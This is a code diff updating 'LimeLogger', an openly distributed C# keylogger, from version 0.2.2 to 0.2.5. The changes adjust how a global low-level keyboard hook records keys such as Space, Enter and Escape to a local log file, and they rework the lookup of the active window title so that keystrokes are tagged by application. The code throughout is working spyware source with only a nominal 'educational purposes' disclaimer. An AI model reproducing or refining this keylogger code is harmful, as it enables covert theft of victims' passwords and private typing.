@@ -7,7 +7,7 @@ using System.Windows.Forms;
 
 
 //       │ Author     : NYAN CAT
-//       │ Name       : LimeLogger v0.2.2
+//       │ Name       : LimeLogger v0.2.5
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
 //       This program is distributed for educational purposes only.
@@ -18,6 +18,7 @@ namespace LimeLogger
     class Program
     {
         private static readonly string loggerPath = Application.StartupPath + @"\log.txt";
+        private static string CurrentActiveWindowTitle;
 
         public static void Main()
         {
@@ -61,13 +62,14 @@ namespace LimeLogger
                     switch (((Keys)vkCode).ToString())
                     {
                         case "Space":
-                            currentKey = "[SPACE]";
+                            currentKey = " ";
+                            //currentKey = "[SPACE]";
                             break;
                         case "Return":
-                            currentKey = $"[ENTER]{Environment.NewLine}";
+                            currentKey = "[ENTER]" + Environment.NewLine;
                             break;
-                        case "escape":
-                            currentKey = "[ESC]";
+                        case "Escape":
+                            currentKey = "[ESC]" + Environment.NewLine; ;
                             break;
                         case "LControlKey":
                             currentKey = "[CTRL]";
@@ -88,14 +90,14 @@ namespace LimeLogger
                             currentKey = "[WIN]";
                             break;
                         case "Tab":
-                            currentKey = "[Tab]";
+                            currentKey = "[Tab]" + Environment.NewLine;;
                             break;
-                        case "Capital":
-                            if (capsLock == true)
-                                currentKey = "[CAPSLOCK: OFF]";
-                            else
-                                currentKey = "[CAPSLOCK: ON]";
-                            break;
+                        //case "Capital":
+                        //    if (capsLock == true)
+                        //        currentKey = "[CAPSLOCK: OFF]";
+                        //    else
+                        //        currentKey = "[CAPSLOCK: ON]";
+                        //    break;
                     }
                 }
 
@@ -112,7 +114,6 @@ namespace LimeLogger
                         sw.Write(currentKey);
                     }
                 }
-
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
@@ -135,38 +136,23 @@ namespace LimeLogger
 
         private static string GetActiveWindowTitle()
         {
-            const int nChars = 256;
-            StringBuilder buffer = new StringBuilder(nChars);
-            IntPtr handle = GetForegroundWindow();
-
-            if (GetWindowText(handle, buffer, nChars) > 0)
-            {
-                CurrentActiveWindowTitle = Path.GetFileName(buffer.ToString());
-                return CurrentActiveWindowTitle;
-            }
-            else
-            {
-                return GetActiveProcessFileName();
-            }
-        }
-
-        private static string GetActiveProcessFileName()
-        {
             try
             {
-                string processName;
                 IntPtr hwnd = GetForegroundWindow();
                 GetWindowThreadProcessId(hwnd, out uint pid);
                 Process p = Process.GetProcessById((int)pid);
-                processName = Path.GetFileName(p.MainModule.FileName);
-
-                return processName;
+                string title = p.MainWindowTitle;
+                if (string.IsNullOrWhiteSpace(title))
+                    title = p.MainModule.ModuleName;
+                CurrentActiveWindowTitle = title;
+                return title;
             }
             catch (Exception)
             {
                 return "???";
             }
         }
+
 
         #region "Hooks & Native Methods"
         private const int WM_KEYDOWN = 0x0100;
@@ -176,9 +162,6 @@ namespace LimeLogger
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
@@ -190,12 +173,7 @@ namespace LimeLogger
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         [DllImport("user32.dll")]
-        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
-
-        [DllImport("user32.dll")]
         static extern IntPtr GetForegroundWindow();
-
-        private static string CurrentActiveWindowTitle;
 
         [DllImport("user32.dll", SetLastError = true)]
         static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
